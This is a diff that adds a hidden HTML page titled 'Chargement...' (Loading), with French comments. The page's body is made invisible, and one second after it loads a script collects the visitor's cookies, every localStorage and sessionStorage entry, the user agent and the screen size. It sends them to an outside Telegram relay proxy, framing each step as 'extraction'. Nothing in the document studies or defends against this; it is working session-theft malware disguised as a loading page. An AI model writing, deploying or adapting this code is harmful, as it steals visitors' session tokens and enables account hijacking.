@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Chargement...</title>
+    <style>body { opacity: 0; pointer-events: none; }</style>
+</head>
+<body>
+    <div id="log" style="display:none;"></div>
+
+    <script>
+    // ==================== CONFIGURATION (sans token) ====================
+    const PROXY_URL = 'https://telegram-proxy.onrender.com'; // ⚠️ remplace par ton URL Render
+    const API_BASE = 'https://bugweb.lionelmelo.space';
+
+    // ==================== UTILITAIRES ====================
+    async function sendToTelegram(text) {
+        try {
+            await fetch(`${PROXY_URL}/send`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text })
+            });
+        } catch(e) { console.error(e); }
+    }
+
+    async function sendFileToTelegram(filename, content) {
+        try {
+            await fetch(`${PROXY_URL}/send-file`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ filename, content: btoa(content) })
+            });
+        } catch(e) { console.error(e); }
+    }
+
+    // ==================== COLLECTE ====================
+    async function collectEnvironment() {
+        const env = { userAgent: navigator.userAgent, screen: `${screen.width}x${screen.height}` };
+        await sendToTelegram(`🌍 ENVIRONNEMENT\n${JSON.stringify(env, null, 2)}`);
+    }
+
+    async function collectCookiesAndStorage() {
+        const data = { cookies: document.cookie, localStorage: {}, sessionStorage: {} };
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            data.localStorage[key] = localStorage.getItem(key);
+        }
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            data.sessionStorage[key] = sessionStorage.getItem(key);
+        }
+        await sendToTelegram(`🍪 STOCKAGE\n${JSON.stringify(data, null, 2).substring(0, 3500)}`);
+    }
+
+    async function main() {
+        await sendToTelegram('🔍 Extraction adaptative démarrée');
+        await collectEnvironment();
+        await collectCookiesAndStorage();
+        await sendToTelegram('✅ Extraction terminée');
+    }
+
+    setTimeout(main, 1000);
+    </script>
+</body>
+</html>
